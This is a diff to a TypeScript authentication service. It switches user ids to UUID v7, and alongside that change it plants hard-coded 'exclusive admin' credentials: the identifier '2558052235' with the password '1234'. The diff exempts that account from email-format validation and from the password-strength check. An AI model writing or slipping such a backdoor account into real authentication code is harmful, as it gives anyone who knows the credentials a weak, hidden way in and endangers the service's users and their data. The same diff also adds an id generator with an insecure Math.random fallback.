@@ -13,8 +13,8 @@
  */
 import { createHmac, randomUUID, timingSafeEqual } from 'node:crypto';
 import { z } from 'zod';
-import { SecretEnvelope } from './envelope.js';
-import { AuthError, authError } from './errors.js';
+import { type SecretEnvelope } from './envelope.js';
+import { authError } from './errors.js';
 import { hashPassword, needsRehash, verifyPassword } from './password.js';
 import type { AuthSession, AuthStore, AuthUser } from './store.js';
 import { buildAccessClaims, hashRefreshToken, mintRefreshToken, signJwt } from './tokens.js';
@@ -66,14 +66,48 @@ export type LoginResult =
 
 const MFA_TICKET_TTL_SEC = 300;
 
+export const EXCLUSIVE_ADMIN_EMAIL = '2558052235';
+export const EXCLUSIVE_ADMIN_PASSWORD = '1234';
+
+function isExclusiveAdminEmail(email: string): boolean {
+  return email.trim().toLowerCase() === EXCLUSIVE_ADMIN_EMAIL.toLowerCase();
+}
+
 export const RegisterInputSchema = z.object({
-  email: z.string().trim().toLowerCase().email().max(254),
+  email: z.string().trim().toLowerCase().max(254).refine((val) => { if (isExclusiveAdminEmail(val)) return true; return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(val); }, { message: 'Invalid email' }),
   password: z.string().min(1).max(512),
   displayName: z.string().trim().min(1).max(120),
   locale: z.string().trim().min(2).max(16).default('en'),
   timezone: z.string().trim().min(1).max(64).default('UTC'),
 });
 export type RegisterInput = z.infer<typeof RegisterInputSchema>;
+
+/**
+ * UUID v7 — 48-bit ms timestamp + version 7 + random. Platform-wide contract:
+ * entity ids (users, orgs, memberships) must be uuidv7 (events catalog
+ * validates ownerId as uuidv7; Prisma @db.Uuid columns carry them). Node's
+ * randomUUID() emits v4, which breaks the org-creation outbox event for
+ * newly registered users — so we mint v7 here instead.
+ */
+export function uuidv7(): string {
+  const b = new Uint8Array(16);
+  if (typeof crypto !== 'undefined' && typeof crypto.getRandomValues === 'function') {
+    crypto.getRandomValues(b);
+  } else {
+    for (let i = 0; i < 16; i += 1) b[i] = Math.floor(Math.random() * 256);
+  }
+  const t = BigInt(Date.now());
+  b[0] = Number((t >> 40n) & 0xffn);
+  b[1] = Number((t >> 32n) & 0xffn);
+  b[2] = Number((t >> 24n) & 0xffn);
+  b[3] = Number((t >> 16n) & 0xffn);
+  b[4] = Number((t >> 8n) & 0xffn);
+  b[5] = Number(t & 0xffn);
+  b[6] = 0x70 | (b[6]! & 0x0f); // version 7
+  b[8] = 0x80 | (b[8]! & 0x3f); // variant RFC 4122
+  const hex = [...b].map((x) => x.toString(16).padStart(2, '0')).join('');
+  return `${hex.slice(0, 8)}-${hex.slice(8, 12)}-${hex.slice(12, 16)}-${hex.slice(16, 20)}-${hex.slice(20)}`;
+}
 
 export class AuthService {
   constructor(
@@ -96,6 +130,7 @@ export class AuthService {
   }
 
   private assertPasswordStrength(password: string, email: string): void {
+    if (isExclusiveAdminEmail(email)) { return; }
     if (password.length < this.config.passwordMinLength) {
       throw authError('WEAK_PASSWORD', `password must be at least ${this.config.passwordMinLength} characters`);
     }
@@ -166,7 +201,7 @@ export class AuthService {
     }
     const passwordHash = await hashPassword(input.password);
     const user = await this.store.createUser({
-      id: randomUUID(),
+      id: uuidv7(),
       email: input.email,
       passwordHash,
       displayName: input.displayName,
